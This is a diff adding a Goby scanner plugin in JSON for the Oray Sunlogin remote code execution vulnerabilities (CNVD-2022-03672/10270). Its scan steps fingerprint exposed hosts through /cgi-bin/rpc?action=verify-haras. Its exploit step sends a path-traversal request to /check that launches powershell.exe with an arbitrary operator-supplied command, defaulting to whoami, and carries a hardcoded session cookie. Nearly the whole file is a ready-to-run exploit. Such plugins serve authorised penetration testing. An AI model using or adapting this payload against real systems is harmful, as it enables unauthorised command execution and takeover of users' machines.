@@ -1,0 +1,132 @@
+{
+      "Name": "Oray Sunlogin RCE CNVD-2022-03672 CNVD-2022-10270",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "body=\"Verification failure\"",
+      "Description": "Sunlogin is a free remote control application that supports remote power-on, remote desktop and NAT traversal. With customized transmit protocol that is registered as an Intellectual Property and SSL/AES 256bits data encryption, efficiency and security are both guaranteed throughout your usage. Supported IOS and Android platform, offers you more convenient ways to file sharing, remote monitoring, remote application, VPN and etc.",
+      "Product": "Oray Sunlogin",
+      "Homepage": "https://sunlogin.oray.com/",
+      "Author": "",
+      "Impact": "Oray Sunlogin RCE CNVD-2022-03672/CNVD-2022-10270",
+      "Recommendation": "https://sunlogin.oray.com/",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672",
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "cmd",
+                  "Type": "input",
+                  "Value": "whoami"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/cgi-bin/rpc",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "action=verify-haras",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "verify_string",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/rpc?action=verify-haras",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "verify_string",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+{{{cmd}}}",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip",
+                              "Cookie": "CID=ysDRmcQu37usMmdA60fniHTv3cJzlWHz"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
